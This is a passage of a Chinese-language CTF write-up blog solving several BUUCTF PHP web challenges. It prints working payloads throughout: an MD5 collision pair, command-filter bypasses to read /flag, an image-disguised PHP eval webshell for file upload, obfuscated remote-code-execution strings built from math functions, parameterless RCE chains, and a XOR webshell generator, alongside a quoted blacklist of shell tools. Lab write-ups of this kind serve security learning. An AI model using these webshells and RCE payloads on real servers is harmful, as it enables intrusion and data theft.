md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>preg_match(&quot;/flag/i&quot;, $file)</code>说明flag在<code>/flag</code>中，同时</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|<span class="symbol">\'</span>|<span class="symbol">\"</span>|<span class="symbol">\`</span>|;|,|<span class="symbol">\*</span>|<span class="symbol">\?</span>|<span class="symbol">\\</span>|<span class="symbol">\\</span><span class="symbol">\\</span>|<span class="symbol">\n</span>|<span class="symbol">\t</span>|<span class="symbol">\r</span>|<span class="symbol">\x</span>A0|<span class="symbol">\&#123;</span>|<span class="symbol">\&#125;</span>|<span class="symbol">\(</span>|<span class="symbol">\)</span>|<span class="symbol">\&amp;</span>[^<span class="symbol">\d</span>]|@|<span class="symbol">\|</span>|<span class="symbol">\\</span>$|<span class="symbol">\[</span>|<span class="symbol">\]</span>|&#123;|&#125;|<span class="symbol">\(</span>|<span class="symbol">\)</span>|-|&lt;|&gt;/i", <span class="keyword">$cmd)</span></span><br></pre></td></tr></table></figure>
<p>对<code>cmd</code>传参内容进行了很多的过滤，可以看到<code>cat</code>被ban了，但是对<code>\</code>用了<code>\\</code>来过滤，之前打比赛遇到过，这样匹配其实匹配不到<code>\</code>，因此可以借助<code>ca\t</code>来绕过，这里其实还可以用<code>sort</code>命令来读取flag的。</p>
<blockquote>
<p><strong>sort</strong>：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p>
</blockquote>
<p>其实Linux中对命令过滤的绕过方式还很多，参考<a href="https://www.cnblogs.com/-chenxs/p/11978488.html">这里</a></p>
<p>另一个考点是<code>MD5</code>强比较绕过：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是固定用法：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">a=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%00</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%55</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span></span><br><span class="line">&amp;b=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%02</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%d5</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span></span><br></pre></td></tr></table></figure>
<p>其实原理是生成两个txt文件，文件内容只有几位不同，但最后的md5值是相同的。</p>
<h3 id="解题-10"><a href="#解题-10" class="headerlink" title="解题"></a>解题</h3><p>利用<code>cmd</code>传参<code>sort%20/flag</code>或<code>ca\t%20/flag</code>即可，当然<code>c\at</code>效果一样，这与linux的命令相关，最后拿到flag。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web61.png" alt=""><br><strong>巨坑！如果想要用BP抓包改POST的内容，web端一定是要POST传数据，不能GET传参之后抓包再改成POST，否则失败！</strong></p>
<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>常规文件上传题，对后缀名进行了过滤，一般用<code>php</code>、<code>php3</code>、<code>php4</code>、<code>php5</code>、<code>phtml</code>、<code>pht</code>来绕过，本题是利用<code>pht</code>绕过的。<br>本题也对<code>&lt;?</code>进行了过滤，利用<code>GIF89a &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</code>即可。</p>
<h3 id="解题-11"><a href="#解题-11" class="headerlink" title="解题"></a>解题</h3><p>上传构造好的小马，抓包之后把文件类型改为<code>image/jpg</code>上传之后即可成功解析<br><img src="http://www.ggb0n.cool/images/BUUCTF-web63.png" alt=""><br>小马存在了<code>/upload</code>路径下，蚁剑连接拿flag。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web62.png" alt=""></p>
<h2 id="CISCN-2019-Love-Math"><a href="#CISCN-2019-Love-Math" class="headerlink" title="[CISCN 2019]Love Math"></a>[CISCN 2019]Love Math</h2><p>主要考察PHP基本函数的利用，还有变量与函数关联的知识</p>
<h3 id="补充知识-1"><a href="#补充知识-1" class="headerlink" title="补充知识"></a>补充知识</h3><p>一些基本的函数：</p>
<blockquote>
<p><code>scandir()</code>函数：返回指定目录中的文件和目录的数组。<br><code>base_convert()</code>函数：在任意进制之间转换数字。<br><code>dechex()</code>函数：把十进制转换为十六进制。<br><code>hex2bin()</code>函数：把十六进制值的字符串转换为 ASCII 字符。<br><code>var_dump()</code>函数:用于输出变量的相关信息。<br><code>readfile()</code>函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回<code>false</code>。您可以通过<code>@readfile()</code>形式调用该函数，来隐藏错误信息。</p>
</blockquote>
<p><strong>动态函数</strong></p>
<blockquote>
<p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数例如：<code>$function = &quot;sayHello&quot;;$function();</code></p>
</blockquote>
<p><strong>php中函数名默认为字符串</strong></p>
<blockquote>
<p>例如本题白名单中的<code>asinh</code>和<code>pi</code>可以直接异或，这就增加了构造字符的选择.</p>
</blockquote>
<h3 id="题目分析-10"><a href="#题目分析-10" class="headerlink" title="题目分析"></a>题目分析</h3><p>打开连接，给出了源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析源码可知，对参数内容作了以下的限制：</p>
<ul>
<li>1、长度不能超过80；</li>
<li>2、不能包含<code></code>,<code>\t</code>,<code>\r</code>,<code>\n</code>,<code>&#39;</code>,<code>&quot;</code>,<code>反引号</code>,<code>[</code>,`]`` 这些字符；</li>
<li>3、不能有不是$whitelist白名单里面的字符串出现；</li>
</ul>
<p>单单传参<code>c</code>肯定是不行了，有两种思路来拿flag：<br><strong>加一个参数</strong>：我们需要构造个<code>$_GET[1]</code>，然后再拿flag，但是<code>[</code>、<code>]</code>都不能用，因此不能直接构造，这个时候我们就可以利用白名单中的那些函数来构造。<br><strong>直接cat flag</strong>：也需要用到上面说的一些函数来构造。<br>主要用到<code>base_convert</code>、<code>dechex</code>两个函数，同时将<code>pi</code>、<code>abs</code>当做参数来利用。</p>
<h3 id="解题-12"><a href="#解题-12" class="headerlink" title="解题"></a>解题</h3><h4 id="加参数"><a href="#加参数" class="headerlink" title="加参数"></a>加参数</h4><p>构造<code>&amp;_GET</code>传参：<br>payload 1：</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">$<span class="literal">pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));($$<span class="literal">pi</span>)&#123;<span class="literal">pi</span>&#125;(($$<span class="literal">pi</span>)&#123;<span class="built_in">abs</span>&#125;)&amp;<span class="literal">pi</span>=system&amp;<span class="built_in">abs</span>=cat /<span class="built_in">flag</span></span><br><span class="line"></span><br><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"hex2bin"</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">"5f474554"</span></span><br><span class="line">$<span class="literal">pi</span>=hex2bin(<span class="string">"5f474554"</span>) =&gt; $<span class="literal">pi</span>=<span class="string">"_GET"</span>   <span class="comment">//hex2bin将一串16进制数转换为二进制字符串</span></span><br><span class="line">($$<span class="literal">pi</span>)&#123;<span class="literal">pi</span>&#125;(($$<span class="literal">pi</span>)&#123;<span class="built_in">abs</span>&#125;) =&gt; ($<span class="variable">_GET</span>)&#123;<span class="literal">pi</span>&#125;($<span class="variable">_GET</span>)&#123;<span class="built_in">abs</span>&#125;  <span class="comment">//&#123;&#125;可以代替[]</span></span><br></pre></td></tr></table></figure>
<p>但是这种方法会报<code>400 Bad Request</code>，可能跟构造的<code>&amp;_GET</code>相关，网上参考到不能<code>&amp;_GET</code>传参，可以用<code>header</code>来传，可以构造如下：<br>payload 2</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">$pi=base_convert,$pi(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line">base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"exec"</span></span><br><span class="line">$pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) =&gt; <span class="string">"getallheaders"</span></span><br><span class="line">exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">//操作xx和yy，中间用逗号隔开，echo都能输出</span></span><br><span class="line">echo xx,yy</span><br></pre></td></tr></table></figure>
<p>这里用到了<code>apache</code>下的<code>getallheaders</code>这个函数：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web64.png" alt=""><br>我们结合这个payload，抓包之后在其中添上<code>1: cat /flag</code>(<strong>这里需要注意一下，BUU的flag都在根目录下，直接cat /flag即可，网上一些参考题解是cat flag.php是读不到的</strong>)，拿到flag：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web65.png" alt=""></p>
<h4 id="直接构造拿cat-flag"><a href="#直接构造拿cat-flag" class="headerlink" title="直接构造拿cat /flag"></a>直接构造拿cat /flag</h4><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">//exec('hex2bin(<span class="name">dechex</span>(<span class="number">109270211257898</span>))') =&gt; exec('cat f*')</span><br><span class="line">($pi=base_convert)(<span class="number">22950</span>,<span class="number">23</span>,<span class="number">34</span>)($pi(<span class="number">76478043844</span>,<span class="number">9</span>,<span class="number">34</span>)(<span class="name">dechex</span>(<span class="number">109270211257898</span>)))</span><br><span class="line">//system('cat'.dechex(<span class="number">16</span>)^asinh^pi) =&gt; system('cat *')</span><br><span class="line">base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br><span class="line">这两条是参考网上的题解，没有做出更改，用的话稍微改一下即可</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>考察无参数RCE，参考<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">这篇文章</a></p>
<h3 id="题目分析-11"><a href="#题目分析-11" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目只有一句<code>flag在哪？</code>其实有点无从下手，参考网上的题解提示是<code>git泄露</code>，但是用<code>githack</code>没跑出来，最后还是用<code>gitextract</code>跑出来了源码：(githack得更新了…)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们需要用<code>exp</code>传参，但是参数会经过三层正则匹配的过滤：<br>第一层：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])</span><br></pre></td></tr></table></figure>
<p>这一层过滤了常用的PHP伪协议<br>第二层：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, NULL, $_GET[<span class="string">'exp'</span>])</span></span>)</span><br></pre></td></tr></table></figure>
<p>这一层的匹配明显提示我们是无参数RCE，其中的<code>?R</code>是递归地进行匹配<br>第三次：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg<span class="constructor">_match('<span class="operator">/</span><span class="params">et</span>|<span class="params">na</span>|<span class="params">info</span>|<span class="params">dec</span>|<span class="params">bin</span>|<span class="params">hex</span>|<span class="params">oct</span>|<span class="params">pi</span>|<span class="params">log</span><span class="operator">/</span><span class="params">i</span>', $<span class="params">_GET</span>['<span class="params">exp</span>'])</span>)</span><br></pre></td></tr></table></figure>
<p>过滤掉常见的关键字。<br>直接getflag不现实了，那就想办法利用函数来获取。</p>
<h3 id="解题-13"><a href="#解题-13" class="headerlink" title="解题"></a>解题</h3><p>首先需要获取当前目录下的文件，可以实现的函数有<code>scandir(.)</code>(.表示当前目录)，但是<code>.</code>又不能用，此时想到<code>localeconv()</code>：函数返回一包含本地数字及货币格式信息的数组。数组的第一项就是<code>.</code><br>这时再借助<code>current()/pos()</code>返回数组中的当前单元, 默认取第一个值。也就是说<code>current(localeconv())</code>就是<code>.</code>了。<br>payload如下：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/?exp=print<span class="constructor">_r(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)));</span><br><span class="line">/?exp=print<span class="constructor">_r(<span class="params">scandir</span>(<span class="params">pos</span>(<span class="params">localeconv</span>()</span>)));</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web66.png" alt=""><br>可以看到<code>flag.php</code>在第四个数组元素中，读取它的源码就能拿到flag。如何读取倒数第二个数组元素呢？</p>
<p>这里有三种方法：<br><strong>1、array_reverse()</strong><br>以相反的顺序返回数组元素，再结合函数<code>next()</code>即可。这里构造payload：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/?exp=print<span class="constructor">_r(<span class="params">next</span>(<span class="params">array_reverse</span>(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br></pre></td></tr></table></figure>
<p>效果如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web67.png" alt=""><br><strong>2、array_rand()和array_flip()</strong><br><code>array_flip()</code>交换数组的键和值；<br><code>array_rand()</code>从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来<code>flag.php</code>。<br>构造payload：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/?exp=print<span class="constructor">_r(<span class="params">array_rand</span>(<span class="params">array_flip</span>(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br></pre></td></tr></table></figure>
<p>效果如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web68.png" alt=""><br><strong>3、session_id(session_start())</strong><br><code>session_start()</code>启动新会话或者重用现有会话；<br><code>session_id()</code>获取到当前的session id;<br>本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。<br>这里使用<code>session</code>之前需要通过<code>session_start()</code>告诉<code>PHP</code>使用<code>session</code>，<code>php</code>默认是不主动使用<code>session</code>的。然后利用<code>session_id()</code>获取到当前的session id。我们再在<code>header</code>中设置<code>PHPSESSID</code>的<code>cookie</code>，值就为<code>flag.php</code>，效果如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web70.png" alt=""></p>
<p>最后如何获取源码呢？<br>因为<code>et</code>被ban，所以可以用<code>readfile()</code>或<code>highlight_file()</code>以及其别名函数<code>show_source()</code>，结合几种方法，最终构造下列payload：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/?exp=readfile(next(<span class="built_in">array</span><span class="constructor">_reverse(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br><span class="line">/?exp=show<span class="constructor">_source(<span class="params">next</span>(<span class="params">array_reverse</span>(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br><span class="line">/?exp=show<span class="constructor">_source(<span class="params">session_id</span>(<span class="params">session_start</span>()</span>));  <span class="comment">//配合BP使用</span></span><br><span class="line">... 自己组合吧</span><br></pre></td></tr></table></figure>
<p>拿到flag：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web69.png" alt=""></p>
<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>考察的知识有点杂，主要涉及<strong>构造不包含数字和字母的webshell</strong>、<strong>文件上传绕过</strong>、<strong>绕过open_basedir/disable_function</strong><br>知识量有点大，好好记录一下。</p>
<h3 id="知识拓展"><a href="#知识拓展" class="headerlink" title="知识拓展"></a>知识拓展</h3><h4 id="构造不包含数字和字母的webshell"><a href="#构造不包含数字和字母的webshell" class="headerlink" title="构造不包含数字和字母的webshell"></a>构造不包含数字和字母的webshell</h4><p>首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出<code>a-z</code>中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如<code>assert</code>，然后动态执行之即可。那么，变换方法 将是解决本题的要点。</p>
<p>不过在此之前，我需要说说php5和7的差异。</p>
<p><code>php5</code>中<code>assert</code>是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p>
<p>但<code>php7</code>中，<code>assert</code>不再是函数，变成了一个语言结构（类似<code>eval</code>），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用<code>file_put_contents</code>函数，同样可以用来<code>getshell</code>。<br>以上参考<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">P神的博客</a>。<br>这里介绍三种构造shell的方法：<br><strong>1、利用异或</strong><br>在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到<code>a-z</code>中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。<br>在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或之后，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。异或操作有时也被用来交换两个变量的值。<br>这里附上一个网上看到的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$l = <span class="string">""</span>;</span><br><span class="line">$r = <span class="string">""</span>;</span><br><span class="line">$argv = str_split(<span class="string">"_GET"</span>);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($argv);$i++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;<span class="number">255</span>;$j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $k = chr($j)^chr(<span class="number">255</span>);      \\dechex(<span class="number">255</span>) = ff</span><br><span class="line">        <span class="keyword">if</span>($k == $argv[$i])&#123;</span><br><span class="line">            <span class="keyword">if</span>($j&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                $l .= <span class="string">"%ff"</span>;</span><br><span class="line">                $r .= <span class="string">"%0"</span> . dechex($j);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $l .= <span class="string">"%ff"</span>;</span><br><span class="line">            $r .= <span class="string">"%"</span> . dechex($j);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\&#123;$l`$r\&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后配合下面的payload，可以执行一些函数。</p>
